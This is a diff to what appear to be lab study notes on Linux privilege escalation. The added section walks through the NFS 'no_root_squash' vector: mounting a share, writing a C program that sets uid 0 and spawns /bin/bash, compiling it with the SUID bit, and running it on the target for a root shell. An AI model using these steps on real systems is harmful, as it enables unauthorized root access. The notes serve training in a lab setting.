@@ -116,9 +116,34 @@ chmod +x /tmp/thm
 # NFS
 NFS (Network File Sharing) configuration is kept in the /etc/exports file. This file is created during the NFS server installation and can usually be read by users. The critical element for this privilege escalation vector is the **“no_root_squash”** option.
 If the “no_root_squash” option is present on a writable share, we can create an executable with SUID bit set and run it on the target system.
+
 1. Check for NFS shares from your machine:
 ```sh
 showmount -e IP
 ```
-2. 📁 **Mount the NFS share to your local directory**:
+2. Mount the NFS share to your local directory:
+```sh
+mount -t nfs <target-ip>:/shared /mnt/nfs
+```
+3. Create a simple C program to spawn a root shell (`nfs.c`):
+```sh
+#include <stdio.h>
+#include <stdlib.h>
+int main() {
+    setuid(0); setgid(0);
+    system("/bin/bash");
+    return 0;
+}
+
+```
+4. Compile the binary and set the SUID bit:
+```sh
+gcc nfs.c -o nfs
+chmod +s nfs
+```
+- **Ensure the file is in the NFS-mounted folder**.
+    
+    - The binary will now appear on the **target system** (due to shared mount).
+        
+- 🚪 **Execute the SUID binary on the target to gain root**:
 # Capstone
